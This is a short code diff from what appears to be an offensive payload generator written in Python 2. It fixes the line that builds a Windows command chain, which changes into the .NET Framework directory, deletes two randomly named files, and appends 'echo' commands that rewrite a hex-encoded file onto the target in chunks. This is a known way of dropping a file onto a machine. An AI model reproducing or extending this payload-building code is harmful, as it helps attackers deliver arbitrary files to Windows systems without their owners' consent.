@@ -101,7 +101,7 @@ class Generator:
 		filepath.append(self.gen_str(random.randrange(5, 25)))
 		data = self.load_file(path).encode("hex")
 		
-		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && del && del %s && " % (filepath[0], filepath[1])
+		payload = "cd C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\ && del %s && del %s && " % (filepath[0], filepath[1])
 		
 		for chunk in re.findall("." * self.chunk_size, data):
 		        payload += "echo %s >> %s && " % (chunk, filepath[0])
